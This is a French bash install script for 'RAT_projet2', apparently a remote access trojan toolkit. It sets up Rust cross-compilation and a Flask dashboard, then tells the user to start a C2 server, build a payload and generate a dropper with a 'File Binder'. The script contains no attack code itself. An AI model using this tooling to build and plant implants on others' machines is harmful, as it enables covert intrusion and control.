#!/usr/bin/env bash
# ============================================================
#  RAT_projet2 — Script d'installation complet
#  Usage : chmod +x install.sh && ./install.sh
# ============================================================
set -e

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; NC='\033[0m'

info()    { echo -e "${GREEN}[✓]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[✗]${NC} $*"; exit 1; }
step()    { echo -e "\n${YELLOW}══════════════════════════════════════${NC}"; echo -e "${YELLOW}  $*${NC}"; echo -e "${YELLOW}══════════════════════════════════════${NC}"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WEB_DIR="$SCRIPT_DIR/web_manager"
RAT_DIR="$SCRIPT_DIR/RAT_projet-main/rat"

# ── Vérification OS ──────────────────────────────────────────
if ! command -v apt-get &>/dev/null; then
    error "Ce script nécessite un système Debian/Ubuntu/Kali (apt-get non trouvé)."
fi

# ── 1. Paquets système ───────────────────────────────────────
step "1/5 — Installation des paquets système"
sudo apt-get update -qq
sudo apt-get install -y -qq \
    curl git build-essential pkg-config \
    libssl-dev musl-tools openssl \
    python3 python3-pip &>/dev/null
info "Paquets système installés."

# ── 2. Rust + Cargo ─────────────────────────────────────────
step "2/5 — Installation de Rust"
if command -v cargo &>/dev/null; then
    info "Rust déjà installé ($(cargo --version))."
else
    warn "Rust non trouvé, installation..."
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --no-modify-path
    info "Rust installé."
fi

# Source cargo env regardless
CARGO_ENV="$HOME/.cargo/env"
if [ -f "$CARGO_ENV" ]; then
    # shellcheck source=/dev/null
    source "$CARGO_ENV"
fi

if ! command -v cargo &>/dev/null; then
    error "cargo non trouvé même après installation. Relance le script ou exécute : source ~/.cargo/env"
fi
info "cargo : $(cargo --version)"

# ── 3. Cibles Rust cross-compilation ────────────────────────
step "3/5 — Ajout des cibles Rust (cross-compilation)"
TARGETS=(
    "x86_64-unknown-linux-musl"
    "aarch64-unknown-linux-musl"
)
for target in "${TARGETS[@]}"; do
    if rustup target list --installed | grep -q "$target"; then
        info "Cible déjà installée : $target"
    else
        rustup target add "$target"
        info "Cible ajoutée : $target"
    fi
done

# ── 4. Dépendances Python ────────────────────────────────────
step "4/5 — Installation des dépendances Python"
if [ -f "$WEB_DIR/requirements.txt" ]; then
    pip3 install -q -r "$WEB_DIR/requirements.txt"
    info "Dépendances Python installées."
else
    pip3 install -q flask werkzeug
    info "Flask installé (requirements.txt non trouvé, installation directe)."
fi

# ── 5. Pré-compilation du client Rust (optionnel) ───────────
step "5/5 — Pré-compilation du client Rust"
if [ -d "$RAT_DIR" ]; then
    warn "Pré-compilation du client Rust (peut prendre quelques minutes)..."
    cd "$RAT_DIR"
    cargo build -p client --release -q && info "Client Rust compilé." || warn "Compilation du client échouée — tu peux le compiler depuis l'interface."
    cd "$SCRIPT_DIR"
else
    warn "Dossier RAT_projet-main/rat non trouvé, ignoré."
fi

# ── Résumé ───────────────────────────────────────────────────
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅  Installation terminée !                    ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Maintenant, lance le dashboard web avec :"
echo -e "  ${YELLOW}cd $WEB_DIR && python3 app.py${NC}"
echo ""
echo -e "  Puis ouvre dans ton navigateur :"
echo -e "  ${GREEN}http://127.0.0.1:5000${NC}"
echo ""
echo -e "  Dans l'interface :"
echo -e "   1. Carte ⚙️  Configuration → clique ${YELLOW}'Générer les clés & Configurer'${NC}"
echo -e "   2. Carte C2 Server → ${YELLOW}Start Server${NC}"
echo -e "   3. Carte Agent Builder → ${YELLOW}Build Payload${NC}"
echo -e "   4. Carte File Binder → génère ton dropper"
echo ""
